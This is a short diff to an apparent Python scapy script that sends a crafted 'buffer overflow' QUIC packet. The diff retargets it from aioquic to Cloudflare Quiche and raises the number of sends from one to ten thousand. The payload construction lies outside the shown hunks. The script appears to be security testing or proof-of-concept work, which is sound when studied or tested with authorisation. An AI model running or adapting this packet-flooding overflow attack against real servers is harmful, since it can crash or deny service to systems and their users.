@@ -1,5 +1,5 @@
-# Server : aioquic
-# Link : https://pgjones.dev/
+# Server : Cloudflare Quiche
+# Link : https://cloudflare-quic.com/
 
 from scapy.all import *
 import codecs
@@ -49,7 +49,8 @@ packet[Raw].load = bytesX
 wrpcap('buffer_overflow.pcapng', packet)
 
 # Send the packet cnt number of times
-cnt=1
-while cnt > 0:
+
+cnt = 10000
+
+for i in range(cnt):
     sendp(packet)
-    cnt -= 1
